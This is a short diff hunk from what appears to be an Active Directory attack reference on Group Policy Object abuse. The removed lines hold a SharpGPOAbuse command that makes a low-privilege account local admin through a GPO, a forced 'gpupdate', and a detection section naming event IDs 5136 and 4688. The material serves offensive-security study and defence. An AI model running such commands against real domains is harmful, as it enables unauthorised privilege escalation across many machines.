@@ -21,15 +21,3 @@ Edit a GPO linked to OUs containing privileged users/computers → push **schedu
 
 ### Commands
 ```powershell
-# ── Add local admin via GPO ─────────────────────────────────────────
-SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowpriv \
-  --GPOName "Vulnerable GPO"
-
-# ── Force policy refresh on target ──────────────────────────────────
-gpupdate /force
-```
-
-### Detection
-**5136** on `groupPolicyContainer`; **4688** `schtasks`/`sc` spawned by `gpscript`; compare GPO versions against baseline.
-
----
